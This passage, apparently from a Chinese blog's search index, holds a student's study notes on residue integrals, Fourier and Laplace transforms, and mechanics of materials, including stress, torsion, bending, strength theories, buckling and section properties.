则$$\\begin{aligned}I&amp;=\\int_{-\\infty}^{+\\infty}\\frac{x^2-x+2}{x^4+10x^2+9}\\mathrm{d}x\\\\&amp;=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z),z_k] \\\\&amp;=2\\pi\\mathrm{i}\\left(\\mathrm{Res}[R(z),\\mathrm{i}]+\\mathrm{Res}[R(z),3\\mathrm{i}]\\right)\\\\&amp;=2\\pi\\mathrm{i}\\left(-\\frac{1+\\mathrm{i}}{16}+\\frac{3-7\\mathrm{i}}{48}\\right) = \\frac{5\\pi}{12}\\end{aligned}$$ 形如 $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x(a&gt;0)$ 的积分要求： $R(x)=\\frac{P(x)}{Q(x)}$ ，其中 $P(x)$ 和 $Q(x)$ 为多项式，且 $Q(x)$ 无实零点。 分母 $Q(x)$ 的次数比分子 $P(x)$ 的次数高 $1$ 或以上。 计算方法： $\\int^{+\\infty}_{-\\infty}R(x)e^{\\mathrm{i}ax}\\mathrm{d}x=2\\pi\\mathrm{i}\\sum\\limits_k\\mathrm{Res}[R(z)e^{\\mathrm{i}az},z_k]$ ， 其中 $z_k$ 为 $R(z)$在上半平面内的孤立奇点。 Fourier变换记得上一年的这个时候就对傅里叶变换有所接触了，然而时光荏苒，却一直没能有什么更深的理解，有些惭愧了。 Fourier 积分公式$$f(t) = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\left[\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\right]e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega$$这个式子有点奇怪，两边都有 $f(t)$ ，那我要来干嘛呢，这时你先别急，下面拆解一下就有意思了。 Fourier 变换上式中令 $F(\\omega)=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t$ ，则 $f(t)=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}F(\\omega)e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega$ ，那么这个关于 $\\omega$ 的函数 $F(\\omega)$ 就是 $f(t)$ 的傅里叶变换。这样一来就可以粗略地理解为傅里叶变换就是把关于时间的函数转换为关于频率的函数，也就是所谓的时域转换为频域。 例 求矩形脉冲函数 $f(t)=\\begin{cases}1, &amp; |t|\\leq a\\\\0, &amp; |t|&gt; a\\end{cases}$ 的傅里叶变换及傅里叶积分表达式。 解 经典例题$$\\begin{aligned}F(\\omega)=\\mathscr{F}[f(t)]&amp;=\\int_{-\\infty}^{+\\infty}f(t)e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\&amp;=\\int_{-a}^{a}e^{-\\mathrm{i}\\omega t} \\mathrm{d}t\\\\&amp;=\\frac{1}{-\\mathrm{i}\\omega}\\left(e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}\\right)\\\\&amp;=\\frac{2}{\\omega}\\cdot\\frac{e^{-\\mathrm{i}\\omega a}-e^{\\mathrm{i}\\omega a}}{-2\\mathrm{i}} \\\\&amp;= \\frac{2}{\\omega}\\cdot\\sin a\\omega\\end{aligned}$$再作傅里叶逆变换，即得傅里叶积分表达式$$\\begin{aligned}f(t)=\\mathscr{F}^{-1}[F(\\omega)]&amp;=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega\\\\&amp;=\\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega + \\frac{\\mathrm{i}}{2\\pi}\\int_{-\\infty}^{+\\infty}\\frac{2\\sin a\\omega}{\\omega}\\sin\\omega t \\mathrm{d}\\omega\\\\&amp;=\\frac{1}{\\pi}\\int_{-\\infty}^{+\\infty}\\frac{\\sin a\\omega}{\\omega}\\cos\\omega t \\mathrm{d}\\omega \\\\&amp;=\\begin{cases}1, &amp; |t| &lt; a \\\\ 1/2, &amp; |t| = a \\\\ 0, &amp; |t| &gt; a\\end{cases}\\end{aligned}$$上式中令 $t=0$ ，可得重要积分公式$$\\int_{-\\infty}^{+\\infty}\\frac{\\sin ax}{x} \\mathrm{d}x=\\pi,\\quad (a&gt;0)$$ $\\delta$ 函数及其 Fourier 变换我们称满足如下条件的函数为 $\\delta$ 函数： 当 $t \\neq0$ 时， $\\delta(t)=0$ ； $\\int_{-\\infty}^{+\\infty}\\delta(t)\\mathrm{d}t = 1$可以看出，这是一个直观上矛盾的函数。书本上也说明了它不是一个经典意义上的函数，而是一个广义函数，有兴趣可以另行搜索。 $\\delta$ 函数有一个性质，就是对任意的连续函数 $f(t)$ ，都有$$\\int_{-\\infty}^{+\\infty}f(t)\\delta(t)\\mathrm{d}t = f(0)$$更一般地，若 $f(t)$ 在 $t=t_0$ 处连续，则$$\\int_{-\\infty}^{+\\infty}f(t)\\delta(t-t_0)\\mathrm{d}t = f(t_0)$$ 这是一个很好的筛选性质。同时其傅里叶变换也很有意思：$$F(\\omega) = \\mathscr{F}[\\delta(t)] = \\int_{-\\infty}^{+\\infty}\\delta(t)e^{-\\mathrm{i}\\omega t}\\mathrm{d}t = e^{-\\mathrm{i}\\omega t}|_{t=0} = 1 \\\\\\delta(t) = \\mathscr{F}^{-1}[1] = \\frac{1}{2\\pi}\\int_{-\\infty}^{+\\infty}e^{\\mathrm{i}\\omega t}\\mathrm{d}\\omega$$ Fourier 变换的性质Fourier 变换的卷积性质简单来说，就是$$f_1(t)*f_2(t) = \\int_{-\\infty}^{+\\infty}f_1(\\tau)f_2(t-\\tau)\\mathrm{d}\\tau$$ Laplace 变换Laplace 变换的概念例 求指数函数 $f(t)=e^{kt} ,k \\in \\mathbb{R}$ 的 Laplace 变换。解 $$\\begin{aligned}F(s)&amp;=\\mathscr{L}[f(t)]\\\\&amp;=\\int_{0}^{\\infty}e^{kt}e^{-st}\\mathrm{d}t\\\\&amp;=\\frac{1}{s-k} \\quad, \\mathrm{Re}(s)&gt;k\\end{aligned}$$ 类似地， $f(t)=\\cos kt$ 的 Laplace 变换为 $F(s)=\\frac{s}{s^2+k^2}$ ， $f(t)=\\sin kt$ 的 Laplace 变换为 $F(s)=\\frac{k}{s^2+k^2}$ 。 Laplace 变换的性质$$\\mathscr{L}[f’(t)]=sF(s)-f(0) \\\\$$更一般地，有$$\\mathscr{L}[f^{(n)}(t)]=s^nF(s) - s^{n-1}f(0) - s^{n-2}f’(0) - \\cdots - f^{(n-1)}(0)$$ Laplace 逆变换例 求 $F(s)=\\frac{1}{s^2(s+1)}$ 的 Laplace 逆变换。解 函数 $F(s)$满足条件 $\\lim\\limits_{s \\to 0}F(s)=0$ ，且 $s=0$ 是 $F(s)$ 的二级极点， $s=-1$是 $F(s)$的一级极点，故$$\\begin{aligned}f(t) = \\mathscr{L}^{-1}[F(s)]&amp;= \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},0\\right] + \\mathrm{Res}\\left[\\frac{e^{st}}{s^s(s+1)},-1\\right] \\\\&amp;= (t-1) + e^{-t},\\quad t &gt; 0\\end{aligned}$$ 卷积Laplace 变换的应用例 求解微分方程 $y’’+\\omega^2y(t)=0, y(0)=0, y’(0)=\\omega$ 。 解 令 $Y(s)=\\mathscr{L}[y(t)]$ ，对方程两边取 Laplace 变换，得$$s^2Y(s)-sy(0)-y’(0)+\\omega^2Y(s)=0$$代入初值条件，得$$s^2Y(s)-\\omega+\\omega^2Y(s)=0 \\\\\\Rightarrow Y(s)=\\frac{\\omega}{s^2+\\omega^2}$$求逆变换，得$$\\begin{aligned}y(t)=\\mathscr{L}^{-1}\\left[\\frac{\\omega}{s^2+\\omega^2}\\right] &amp;= \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},w\\mathrm{i}\\right] + \\mathrm{Res}\\left[\\frac{we^{s\\mathrm{i}}}{s^2+w^2},-w\\mathrm{i}\\right] \\\\&amp;= \\lim_{s\\to w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)’} + \\lim_{s\\to -w\\mathrm{i}}\\frac{we^{s\\mathrm{i}}}{(s^2+w^2)’} \\\\&amp;=\\frac{we^w\\mathrm{i}t}{2w\\mathrm{i}}+\\frac{we^{-w\\mathrm{i}t}}{-2w\\mathrm{i}} \\\\&amp;=\\frac{2\\mathrm{i}\\sin wt}{2\\mathrm{i}}=\\sin wt\\end{aligned}$$","link":"/2022/10/09/%E5%A4%8D%E5%8F%98%E5%87%BD%E6%95%B0%E7%AC%94%E8%AE%B0/"},{"title":"材料力学笔记","text":"莫名其妙考了个第一，来还个愿 最近买了台二手服务器，折腾了一些集群、容器、虚拟化之类的东西，比较偏操作也没啥好记的，就很长时间没更了。 这里大致记一下概念，捋一下思路。 绪论材料力学的任务使材料满足三个要求：强度、刚度、稳定性。 变形固体的基本假设三个假设：连续性、均匀性、各向同性。 变形与应变应变 $\\varepsilon$ 和切应变 $\\gamma$ 是度量一点处变形程度的两个基本量，量纲为一。 杆件变形的基本形式拉伸或压缩、剪切、弯曲、扭转。 拉伸、压缩与剪切直杆轴向拉伸或压缩时斜截面上的应力拉（压）杆的破坏并不总是沿横截面发生，有时沿斜截面发生。 设与横截面成 $\\alpha$ 角的斜截面 $k-k$ 的面积为 $A_\\alpha$，横截面的面积为 $A$，则$$A_\\alpha = \\frac{A}{\\cos\\alpha}$$ 把应力 $p_\\alpha$ 分解成垂直于斜截面的正应力 $\\sigma_\\alpha$ 和沿斜截面的剪应力 $\\tau_\\alpha$，则$$\\sigma_\\alpha = p_\\alpha\\cos\\alpha = \\sigma\\cos^2\\alpha \\\\\\tau_\\alpha = p_\\alpha\\sin\\alpha = \\sigma\\cos\\alpha\\sin\\alpha = \\frac{\\sigma}{2}\\sin2\\alpha$$ 当 $\\alpha = 0$ 时，$\\sigma_\\alpha$ 达到最大值，即$$\\sigma_{\\alpha \\mathrm{max}} = \\sigma$$ 材料拉伸时的力学性能低碳钢的力学性能大致如下： 弹性阶段：应力 $\\sigma$ 与应变 $\\varepsilon$ 成正比，即有 $\\sigma = E\\varepsilon$ ，$E$ 为弹性模量。直线最高点对应的应力 $\\sigma_\\mathrm{p}$ 称为比例极限，超过这个比例极限后，还有一个弹性极限，这两点间虽然不是直线，但松开后变形还是可以完全消失的，但两点非常接近，所以实际上不作严格区分。 屈服阶段：一段小锯齿，应变明显增加，应力先下降再小波动，先下降的那个最低点为屈服阶段或屈服强度，记作 $\\sigma_\\mathrm{s}$ 。 强化阶段：恢复抵抗变形能力，最高点对应应力 $\\sigma_\\mathrm{b}$ 为强度极限。 局部变形阶段：过强度极限后出现缩颈 铸铁在较小拉应力下就被拉断，没有屈服和缩颈现象，拉断前的应变也小，是典型的脆性材料。 材料压缩时的力学性能 什么？这不是饼干，这是一个压缩毛巾啊……（滑稽） 低碳钢压缩时的弹性模量 $E$ 和屈服极限 $\\sigma_\\mathrm{s}$ 都和拉伸时大致相同，之后越压越扁，也越来越难压，所以得不到压缩时的强度极限。 铸铁仍在较小变形下突然破坏，破坏断面法线与轴线大致成 45° - 55° 角。 失效、安全因数和强度计算对塑性材料，$[\\sigma] = \\frac{\\sigma_\\mathrm{s}}{n_\\mathrm{s}}$；对脆性材料，$[\\sigma] = \\frac{\\sigma_\\mathrm{b}}{n_\\mathrm{b}}$。其中 $n_\\mathrm{s}$ 和 $n_\\mathrm{b}$ 称为安全系数，有$$\\sigma = \\frac{F_\\mathrm{N}}{A} \\leqslant [\\sigma]$$ 轴向拉伸或压缩时的变形$$\\Delta l = \\frac{F_\\mathrm{N}l}{EA} = \\frac{Fl}{EA}$$ 可以看出，对长度相同、受力相等的杆件，$EA$ 越大变形 $\\Delta l$ 就越小，所以 $EA$ 越大的材料越强，称为杆件的抗拉（压）刚度。 试验表明，应力不超过比例极限时横向应变 $\\varepsilon’$ 与轴向应变 $\\varepsilon$ 之比是一个常数，即$$\\mu = -\\frac{\\varepsilon’}{\\varepsilon}$$$\\mu$ 称为横向变形因数或泊松比。之所以有个负号，是因为一般材料都是伸长时横向缩小，压缩时横向增大。 轴向拉伸或压缩时的应变能杆件拉伸时，有 $W = \\frac12F\\Delta l$，忽略动能、热能等变化，杆件就只存到了应变能 $V_\\varepsilon = W = \\frac12F\\Delta l = \\frac{F^2l}{2EA}$，比能 $v_\\varepsilon = \\frac12\\sigma\\varepsilon$。 能量法解题时需要计算应变能。 拉伸、压缩超静定问题理论力学默认材料都是刚体，没法解决超静定问题，但实际上材料总是会变形的。 温度应力和装配应力温度变化为 $\\Delta T$ 时，杆件变形为$$\\Delta l_T = \\alpha_l\\Delta T\\cdot l$$式中 $\\alpha_l$ 为材料的线胀系数。 剪切和挤压的实用计算$$\\tau = \\frac{F_\\mathrm{S}}{A} \\leqslant [\\tau]$$ 扭转外力偶矩的计算由$$2\\pi \\times \\frac{n}{60} \\times M_\\mathrm{e} = P \\times 1000$$得出计算外力偶矩 $M_\\mathrm{e}$ 的公式为$${M_\\mathrm{e}}_{\\mathrm{N\\cdot m}} = 9549 \\frac{{P}_\\mathrm{kW}}{{n}_\\mathrm{r/min}}$$ 纯剪切对各向同性材料，三个弹性常数 $E,G,\\mu$ 之间存在下列关系：$$G = \\frac{E}{2(1+\\mu)}$$ 圆轴扭转时的应力最大切应力$$\\tau_\\mathrm{max} = \\frac{T}{W_\\mathrm{t}}$$式中 $W_\\mathrm{t}=I_p/R$ 为抗扭(twist)截面系数。圆截面的抗扭截面系数为$$W_\\mathrm{t} = \\frac{\\pi D^3}{16}$$空心圆截面的抗扭截面系数为$$W_\\mathrm{t} = \\frac{\\pi}{16D}(D^4 - d^4) = \\frac{\\pi D^3}{16}(1 - \\alpha^4)$$ 圆轴扭转时的变形距离为 $l$ 的两个横截面之间的相对转角为$$\\varphi = \\frac{Tl}{G I_\\mathrm{p}}$$$\\varphi$ 的变化率 $\\varphi’$ 为单位长度扭转角，单位为 rad/m，即$$\\varphi’_\\mathrm{max} = \\frac{T}{G I_\\mathrm{p}} \\leqslant [\\varphi’]$$式中 $I_\\mathrm{p}$ 为横截面对圆心 $O$ 点的极惯性矩，即$$I_\\mathrm{p} = \\int_A \\rho^2 \\mathrm{d}A$$圆截面的 $I_\\mathrm{p} = \\frac{\\pi D^4}{32}$，空心圆截面的 $I_\\mathrm{p} = \\frac{\\pi D^4}{32}(1 - \\alpha^4)$。 圆柱形密圈螺旋弹簧的应力和变形弹簧最大切应力$$\\tau_\\mathrm{max} = \\left(\\frac{4c-1}{4c-4}+\\frac{0.615}{c}\\right)\\frac{8FD}{\\pi d^3} = k\\frac{8FD}{\\pi d^3}$$式中 $c=\\frac Dd$ 为弹簧指数，$k$ 为曲度系数。 刚度系数$$C = \\frac{Gd^4}{8D^3n} = \\frac{Gd^4}{64R^3n}$$代表弹簧抵抗变形的能力。变形 $\\lambda = \\frac{F}{C}$ 。 非圆截面杆扭转的概念$$\\tau_\\mathrm{max} = \\frac{T}{\\alpha hb^2}$$ 弯曲内力弯曲的概念和实例以弯曲变形为主的杆件习惯上称为梁。 剪力和弯矩符号规定： 剪力：截面 $m-m$ 的左段对右段向上相对错动时，截面 $m-m$ 上的剪力规定为正；反之为负。 弯矩：截面 $m-m$ 处弯曲变形凸向下时，截面 $m-m$ 上的弯矩规定为正；反之为负。 计算剪力和弯矩时注意考虑支座反力。弯矩方程对距离求导为剪力方程。 平面曲杆的弯曲内力分析时取圆心角为 $\\varphi$ 的横截面 $m-m$ 将曲杆分成两部分，然后列平衡方程。 符号规定： 引起拉伸变形的轴力 $F_\\mathrm{N}$ 为正 使轴线曲率增加的弯矩 $M$ 为正 以剪力 $F_\\mathrm{S}$ 对所考虑的一段曲杆内任一点取矩，若力矩为顺时针方向，则剪力 $F_\\mathrm{S}$ 为正 弯曲应力概述弯矩 $M$ 只与横截面上的正应力 $\\sigma$ 有关，剪力 $F_\\mathrm{S}$ 只与横截面上的切应力 $\\tau$ 有关。 梁中间段上剪力为零，弯矩为常量的情况称为纯弯曲。 梁发生弯曲变形时长度不变的纤维层称为中性层，中性层与横截面的交线称为中性轴。 横力弯曲时的正应力工程实际中觉的弯曲问题多为横力弯曲，此时梁的横截面上不仅有正应力而且有切应力。 一般情况下，最大正应力 $\\sigma_\\mathrm{max}$ 发生于弯矩最大的截面上，且离中性轴最远处，即$$\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}y_\\mathrm{max}}{I_z}$$引入记号$$W = \\frac{I_z}{y_\\mathrm{max}}$$则有$$\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}}{W}$$$W$ 称为抗弯截面系数，与截面的几何形状有关，单位为 $\\mathrm{m}^3$ 。 若截面是高为 $h$、宽为 $b$ 的矩形，则$$W = \\frac{I_z}{h/2} = \\frac{bh^3/12}{h/2} = \\frac{bh^2}{6}$$若截面是直径为 $d$ 的圆形，则$$W = \\frac{I_z}{d/2} = \\frac{\\pi d^4/64}{d/2} = \\frac{\\pi d^3}{32}$$类似地，空心圆形截面的抗弯截面系数为$$W = \\frac{\\pi d^3(1-\\alpha^4)}{32}$$弯曲正应力的强度条件为$$\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}}{W} \\leqslant [\\sigma]$$ 弯曲切应力$$S_z^* = \\int_{A_1}y_1\\mathrm{d}A$$是横截面的部分面积 $A_1$ 对中性轴的静矩。 一般说，在剪力为最大值的截面的中性轴上，出现最大切应力，且$$\\tau_\\mathrm{max} = \\frac{F_\\mathrm{Smax}S^*_\\mathrm{zmax}}{I_z b}$$ 矩形截面梁的最大切应力$$\\tau_\\mathrm{max} = \\frac{3}{2}\\frac{F_\\mathrm{S}}{bh}$$为平均切应力的 1.5 倍。 圆形截面梁的最大切应力$$\\tau_\\mathrm{max} = \\frac43\\frac{F_\\mathrm{S}}{\\pi R^2}$$为平均切应力的 $\\frac43$ 倍。 提高弯曲强度的措施对抗拉和抗压强度相同的材料（如碳钢）宜采用中性轴对称的截面，对抗拉和抗压强度不相等的材料（如铸铁）宜采用中性轴偏向于受拉一侧的截面形状。如能使 $y_1$ 和 $y_2$ 之比接近于下列关系：$$\\frac{\\sigma_\\mathrm{tmax}}{\\sigma_\\mathrm{cmax}} = \\frac{M_\\mathrm{max}y_1}{Iz}/\\frac{M_\\mathrm{max}y_2}{Iz} = \\frac{y_1}{y_2} = \\frac{[\\sigma_\\mathrm{t}]}{[\\sigma_\\mathrm{c}]}$$式中 $[\\sigma_\\mathrm{t}]$ 和 $[\\sigma_\\mathrm{c}]$ 分别表示拉伸（Tension）和压缩（Compression）的许用应力，则最大拉应力和最大压应力可同时接近许用应力。强度校核时超过百分之 $5$ 以内都可接受（跟开车超速一点点不扣分差不多）。 弯曲变形挠曲线的微分方程发生弯曲变形时，变形前为直线的梁轴线，变形后成为一条连续且光滑的曲线，称为挠曲线。 用积分法求弯曲变形边界条件：在固定端，挠度和转角都为零，在铰支座上，挠度为零。$$EIw’’ = M(x)$$然后对 $x$ 积分两次，代入边界条件和连续条件确定积分常数，得到挠曲线方程。注意 $w’$ 即为 $\\theta$ 。 用叠加法求弯曲变形弯曲变形很小且材料服从胡克定律时，挠曲线的微分方程是线性的。 应力和应变分析 强度理论应力状态概述切应力等于零的面称为主平面，主平面上的正应力称为主应力。 二向和三向应力状态的实例圆筒的壁厚 $\\delta$ 远小于它的内径 $D$ 时，称为薄壁圆筒。若封闭的薄壁圆筒所受内压为 $p$ ，则其横截面上应力$$\\sigma’ = \\frac FA = \\frac{p\\cdot\\frac{\\pi D^2}{4}}{\\pi D\\delta} = \\frac{pD}{4\\delta}$$纵向截面上应力$$\\sigma’’ = \\frac{pD}{2\\delta}$$ 在研究一点的应力状态时，通常用 $\\sigma_1,\\sigma_2,\\sigma_3$ 代表该点的三个主应力，并以 $\\sigma_1$ 代表代数值最大的主应力，$\\sigma_3$ 代表代数值最小的主应力，即 $\\sigma_1 \\geqslant \\sigma_2 \\geqslant \\sigma_3$ 。 二向应力状态分析————解析法$\\sigma_x$ 和 $\\tau_{xy}$ 是法线与 $x$ 轴平行的面上的正应力和切应力；$\\sigma_y$ 和 $\\tau_{yx}$ 是法线与 $y$ 轴平行的面上的正应力和切应力。符号规定：正应力拉正压负，切应力对单元体内任意点的矩为顺时针转向时为正，反之为负，这里与平常不同。取任意斜截面，其外法线 $n$ 与 $x$ 轴的夹角为 $\\alpha$ 。规定：由 $x$ 轴转到外法线 $n$ 为逆时针转向时，则 $\\alpha$ 为正。 $$\\left.\\begin{aligned}\\sigma_\\mathrm{max} \\\\\\sigma_\\mathrm{min}\\end{aligned}\\right\\}= \\frac{\\sigma_x+\\sigma_y}{2} \\pm \\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}$$$$\\left.\\begin{aligned}\\tau_\\mathrm{max} \\\\\\tau_\\mathrm{min}\\end{aligned}\\right\\}= \\pm \\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}$$$$\\sigma_\\alpha = \\frac{\\sigma_x+\\sigma_y}{2} + \\frac{\\sigma_x-\\sigma_y}{2}\\cos2\\alpha - \\tau_{xy}\\sin2\\alpha \\\\\\tau_\\alpha = \\frac{\\sigma_x-\\sigma_y}{2}\\sin2\\alpha + \\tau_{xy}\\cos2\\alpha$$ 二向应力状态分析————图解法上面两式两边平方然后相加可消去 $\\alpha$ ，得$$\\left(\\sigma_\\alpha-\\frac{\\sigma_x+\\sigma_y}{2}\\right)^2 + \\tau_\\alpha^2 = \\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2$$$\\sigma_x,\\sigma_y,\\tau_{xy}$ 均为已知量，可此式是一个以 $\\sigma_\\alpha$ 和 $\\tau_\\alpha$ 为变量的圆方程，以横坐标表示 $\\sigma$ ，纵坐标表示 $\\tau$ ，则圆心横坐标为 $\\frac{1}{2}(\\sigma_x+\\sigma_y)$ ，纵坐标为零，半径为 $\\sqrt{\\left(\\frac{\\sigma_x-\\sigma_y}{2}\\right)^2 + \\tau_{xy}^2}$ 。这一圆周称为应力圆。 作法： 在坐标系取点 $A(\\sigma_x,0)$ ，$D(\\sigma_x,\\tau_{xy})$ ，$B(\\sigma_y,0)$ ，$D’(\\sigma_y,-\\tau_{xy})$ 。 连接 $D$ 和 $D’$ ，与横坐标交于 $C$ 点，以 $C$ 为圆心， $CD$ 为半径画圆，得到应力圆。 在应力圆上，从 $D$ 点（它代表以 $x$ 轴为法线的面上的应力）也按逆时针方向沿圆周转到 $E$ 点，且使 $DE$ 弧所对圆心角为 $\\alpha$ 的 $2$ 倍，则 $E$ 点的坐标就代表以 $n$ 为法线的斜面上的应力。 三向应力状态$$\\sigma_\\mathrm{max} = \\sigma_1, \\quad\\sigma_\\mathrm{min} = \\sigma_3, \\quad\\tau_\\mathrm{max} = \\frac{\\sigma_1-\\sigma_3}{2}$$$\\sigma_2$ 就是一般就是垂直于 $\\sigma_1$ 和 $\\sigma_3$ 的应力。 广义胡克定律$$\\varepsilon_x = \\frac1E[\\sigma_x-\\mu(\\sigma_y+\\sigma_z)]$$ $$\\varepsilon_1 = \\frac1E[\\sigma_1-\\mu(\\sigma_2+\\sigma_3)] \\\\\\varepsilon_2 = \\frac1E[\\sigma_2-\\mu(\\sigma_1+\\sigma_3)] \\\\\\varepsilon_3 = \\frac1E[\\sigma_3-\\mu(\\sigma_1+\\sigma_2)]$$ 四种常用强度理论最大拉应力理论（第一强度理论）$$\\sigma_{\\mathrm{r}1} = \\sigma_1$$最大伸长线应力理论（第二强度理论）$$\\sigma_{\\mathrm{r}2} = \\sigma_1 - \\mu(\\sigma_2+\\sigma_3)$$最大切应力理论（第三强度理论）$$\\sigma_{\\mathrm{r}3} = \\sigma_1 - \\sigma_3$$最大畸变能密度理论（第四强度理论）$$\\sigma_{\\mathrm{r}4} = \\sqrt{\\frac12[(\\sigma_1-\\sigma_2)^2+(\\sigma_2-\\sigma_3)^2+(\\sigma_3-\\sigma_1)^2]}$$ 莫尔强度理论$$\\sigma_\\mathrm{rM} = \\sigma_1 - \\frac{[\\sigma_t]}{[\\sigma_c]}\\sigma_3$$ 组合变形扭转与弯曲的组合$$M = \\sqrt{M_{y\\mathrm{max}}^2+M_{z\\mathrm{max}}^2}$$按第三强度理论，有$$\\sqrt{\\sigma^2+4\\tau^2} \\leqslant [\\sigma] \\\\\\frac1W\\sqrt{M^2+T^2} \\leqslant [\\sigma]$$按第四强度理论，有$$\\sqrt{\\sigma^2+3\\tau^2} \\leqslant [\\sigma] \\\\\\frac1W\\sqrt{M^2+0.75T^2} \\leqslant [\\sigma]$$ 压杆稳定压杆稳定的概念细长杆件受压时，设压力与轴线重合，压力小于某一极限值时，压杆一直保持直线形状的平衡，即便有微小的侧向干扰力使其暂时发生轻微弯曲，干扰力解除后，压杆也能恢复直线形状，这表明压杆直线形状的平衡是稳定的。但是如果压力大于某一极限值时，压杆的直线平衡变为不稳定，将转变为曲线形状的平衡。这时再用微小的侧向干扰力使其发生轻微弯曲，干扰力解除后，它将保持曲线形状的平衡，不能恢复到原有的直线形状。 上述压力的极限值称为临界压力或临界力，记为 $F_\\mathrm{cr}$ 。压杆丧失其直线形状的平衡而过渡为曲线平衡，称为丧失稳定性，简称失稳，也称为屈曲。 其他支座条件下细长压杆的临界压力欧拉公式的普遍形式为$$F_\\mathrm{cr} = \\frac{\\pi^2EI}{(\\mu l)^2}$$式中 $\\mu l$ 表示把压杆折算成两端铰支杆的长度，称为相当长度，$\\mu$ 称为长度因数，不同情况下的长度因数 $\\mu$ 列表如下： 压杆的约束条件 长度因数 两端铰支 $\\mu=1$ 一端固定，另一端自由 $\\mu=2$ 两端固定 $\\mu=\\frac12$ 一端固定，另一端铰支 $\\mu\\approx0.7$ 欧拉公式的适用范围 经验公式$$\\sigma_\\mathrm{cr} = \\frac{F_\\mathrm{cr}}{A} = \\frac{\\pi^2EI}{(\\mu l)^2A}$$$ \\sigma_\\mathrm{cr}$ 称为临界应力。把横截面的惯性矩 $I$ 写成$$I = i^2A$$上式可以写成$$\\sigma_\\mathrm{cr} = \\frac{\\pi^2E}{(\\frac{\\mu l}{i})^2A}$$引用记号$$\\lambda = \\frac{\\mu l}{i}$$$\\lambda$ 是一个量纲一的量，称为柔度或长细比，综合反映了压杆的长度、约束条件、截面尺寸和形状等因素对临界应力 $\\sigma_\\mathrm{cr}$ 的影响。计算临界应力的公式可以写成$$\\sigma_\\mathrm{cr} = \\frac{\\pi^2E}{\\lambda^2}$$这是欧拉公式的另一种表达形式，其适用范围为$$\\lambda \\leqslant \\lambda_\\mathrm{p} = \\pi\\sqrt{\\frac{E}{\\sigma_\\mathrm{p}}}$$ 压杆的稳定性校核$F_\\mathrm{cr}$ 与 $F$ 之比即为压杆的工作安全因数 $n$，它应大于规定的稳定安全因数 $n_\\mathrm{st}$，即$$n = \\frac{F_\\mathrm{cr}}{F} \\geqslant n_\\mathrm{st}$$ 平面图形的几何性质静矩和形心在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分$$S_z = \\int_A y\\mathrm{d}A, \\quad S_y = \\int_A z\\mathrm{d}A$$分别定义为图形对 $z$ 轴和 $y$ 轴的静矩，也称为图形对 $z$ 轴和 $y$ 轴的一次矩。这个坐标轴之所以只有 $y$ 和 $z$ 而没有 $x$ ，是因为我们一般分析的是横截面，$x$ 轴是杆的轴线方向。可以看出，平面图形的静矩是对某一坐标轴而言的，也就是说，同一图形对不同的坐标轴的静矩通常是不同的。静矩的量纲是长度的三次方。 平面图形对 $y$ 轴和 $z$ 轴的静矩，分别等于图形面积 $A$ 乘形心的坐标 $\\overline{z}$ 和 $\\overline{y}$ ，即$$S_z = A\\cdot\\overline{y}, \\quad S_y = A\\cdot\\overline{z}$$ 惯性矩和惯性半径在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分$$I_y = \\int_A z^2\\mathrm{d}A, \\quad I_z = \\int_A y^2\\mathrm{d}A$$分别定义为图形对 $y$ 轴和 $z$ 轴的惯性矩，也称为图形对 $y$ 轴和 $z$ 轴的二次矩。惯性矩的量纲是长度的四次方。矩形的对形心轴的 $I_z$ 为 $\\frac{bh^3}{12}$ 。力学计算中，有时把惯性矩写成图形面积 $A$ 与某一长度的平方的乘积，即$$I_y = A\\cdot i_y^2, \\quad I_z = A\\cdot i_z^2$$或者改写为$$i_y = \\sqrt{\\frac{I_y}{A}}, \\quad i_z = \\sqrt{\\frac{I_z}{A}}$$式中的 $i_y$ 和 $i_z$ 分别称为图形对 $y$ 轴和 $z$ 轴的惯性半径。惯性半径的量纲就是长度的量纲。 以 $\\rho$ 表示微面积 $\\mathrm{d}A$ 到坐标原点 $O$ 的距离，下列积分$$I_\\mathrm{p} = \\int_A \\rho^2\\mathrm{d}A$$定义为图形对坐标原点 $O$ 的极惯性矩。又 $\\rho^2 = y^2+z^2$ ，于是有$$I_\\mathrm{p} = \\int_A (y^2+z^2)\\mathrm{d}A = \\int_A y^2\\mathrm{d}A + \\int_A z^2\\mathrm{d}A = I_z + I_y$$ 惯性积在坐标 $(y,z)$ 处，取微面积 $\\mathrm{d}A$ ，遍及整个图形面积 $A$ 的积分$$I_{yz} = \\int_A yz\\mathrm{d}A$$定义为图形对 $y,z$ 轴的惯性积。惯性积的量纲是长度的四次方。坐标系的两根坐标轴中只要有一根为图形对称轴，则图形对这一坐标系的惯性积就等于零。 平行移轴公式$$I_y = I_{yC} + a^2A \\\\I_z = I_{zC} + b^2A 